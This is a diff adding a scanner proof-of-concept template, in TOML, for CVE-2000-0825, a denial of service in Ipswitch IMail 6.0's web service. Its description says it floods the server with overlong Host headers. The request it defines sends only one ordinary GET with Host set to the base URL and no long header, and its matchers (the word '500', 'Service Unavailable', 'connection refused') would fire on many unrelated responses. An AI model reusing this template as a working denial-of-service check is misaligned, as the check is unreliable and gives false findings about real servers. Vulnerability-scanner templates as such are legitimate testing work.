@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "通过发送大量包含超长Host头的HTTP请求，导致Ipswitch IMail 6.0服务线程崩溃，造成拒绝服务"
+id = "POC-AVE-2000-0961"
+name = "Ipswitch IMail 6.0 Web Service 长Host头拒绝服务漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0825",
+    "dos",
+    "imail",
+]
+vuln_id = [
+    "CVE-2000-0825",
+    "AVE-2000-0961",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Host = "{{BaseURL}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Service Unavailable",
+    "500",
+    "connection refused",
+]
